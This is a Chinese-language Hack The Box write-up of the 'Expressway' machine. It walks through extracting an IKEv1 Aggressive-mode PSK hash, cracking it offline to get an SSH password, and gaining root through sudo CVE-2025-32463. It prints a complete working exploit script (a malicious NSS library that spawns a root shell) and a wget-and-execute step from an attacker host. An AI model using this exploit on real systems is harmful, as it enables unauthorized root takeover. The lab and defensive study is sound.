---
title: "Expressway - Linux - Easy"
date: 2025-11-13
draft: false
description: "Expressway 靶机通关记录:IKEv1 Aggressive 模式泄露 PSK 哈希,离线爆破出预共享密钥后直接登录 SSH;提权踩中 sudo 1.9.17 的 CVE-2025-32463。"
tags: ["Linux"]
categories: ["Writeup"]
isStarred: false
---

Expressway 的入口不在 Web 上——对外只开了 SSH 和 IKE。IKEv1 用了 Aggressive 模式,这种模式会在**认证之前**把 PSK 哈希交出去,离线爆破出预共享密钥后它直接就是 SSH 密码。提权部分则是 sudo 1.9.17 的 CVE-2025-32463。

- **环境**:HTB · Linux · Easy
- **目标**:`10.10.11.87`
- **日期**:2025-11-13

---

## 1. 侦察

TCP 全端口只有一个服务:

```bash
nmap -A -Pn 10.10.11.87
```

```
22/tcp open  ssh  OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

UDP 扫描才有收获:

```bash
nmap -A -Pn -sU 10.10.11.87
```

```
68/udp   open|filtered dhcpclient
69/udp   open          tftp      Netkit tftpd or atftpd
500/udp  open          isakmp?
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0
4500/udp open|filtered nat-t-ike
```

`500/udp` 是 IKE(IPsec 的密钥交换)。`4500` 是 NAT-T。这条线基本就是整台机器的入口。

---

## 2. IKE 枚举与 PSK 破解

用 `ike-scan` 主动探测:

```bash
ike-scan -A 10.10.11.87
```

```
10HDR=(CKY-R=fd51d52be4b1d057) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    KeyExchange(128 bytes) Nonce(32 bytes)
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    VID=09002689dfd6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
    Hash(20 bytes)
```

两个关键信息:认证方式 `Auth=PSK`,以及身份 `ike@expressway.htb`——用户名 `ike`,域名 `expressway.htb`。

域名加进 `/etc/hosts` 后,用**伪造 ID** 主动索取哈希。Aggressive 模式下 PSK 哈希在认证前就发出来了,这就是漏洞所在:

```bash
ike-scan -P -M -A -n fakeID 10.10.11.87 > hash
```

拿到哈希后离线爆破:

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash
```

```
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 4c157f81a88a0f5a13fe70f9a7b4627e9ea3e08b
Ending psk-crack: 8045040 iterations in 15.800 seconds (509190.67 iterations/sec)
```

预共享密钥:**`freakingrockstarontheroad`**。

---

## 3. 初始访问

PSK 直接就是 SSH 密码:

```bash
ssh ike@expressway.htb
```

登录成功后 user.txt 就在家目录:

```bash
cat user.txt
```

---

## 4. 权限提升

上传 `linpeas.sh` 跑一遍枚举,关键发现只有一条:

```
Sudo version 1.9.17
```

这个版本存在 **CVE-2025-32463**:`sudo -R`(chroot)在处理 NSS 配置时,会加载 chroot 目录下攻击者可控的 `nsswitch.conf`,进而以 root 身份加载任意共享库。

公开 PoC:[Rajneeshkarya/CVE-2025-32463](https://github.com/Rajneeshkarya/CVE-2025-32463)

核心逻辑是伪造一个 chroot 目录,在里面放自己的 `nsswitch.conf` 和一个编译好的恶意 `.so`,`sudo -R fake_root fake_root` 一执行就会以 root 加载它:

```bash
#!/bin/bash
WORKDIR=$(mktemp -d /tmp/sudo-exploit.XXXXXX)
cd "${WORKDIR?}" || exit 1

cat > exploit1337.c << EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p fake_root/etc libnss_
echo "passwd: /exploit1337" > fake_root/etc/nsswitch.conf
cp /etc/group fake_root/etc/

gcc -shared -fPIC -Wl,-init,woot -o libnss_/exploit1337.so.2 exploit1337.c

sudo -R fake_root fake_root

rm -rf "${WORKDIR}"
```

把脚本放进靶机执行:

```bash
wget http://10.10.16.15:8888/exp.sh
chmod +x exp.sh
./exp.sh
```

```
[+] Launching exploit via sudo...
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

root.txt 在 `/root` 下。

---

## 5. 收尾

这台机器考的是**把非 Web 服务当成入口**。端口列表里没有 80/443,只有 SSH 和 IKE,而 IKEv1 Aggressive 模式的设计缺陷(先泄露哈希、后认证)正好可以被离线利用。

两个值得记的点:

- **Aggressive 模式 = 凭据泄露**。它为了少一个往返,把身份和哈希都提前发出去。只要认证方式是 PSK,抓到哈希就能离线爆破,爆破成本完全取决于口令强度。
- **同一个密钥出现在两个地方**。这里的 PSK 既是 IPsec 的预共享密钥,又是 SSH 密码——真实环境里这种复用很常见,一次泄露就横向打通了。
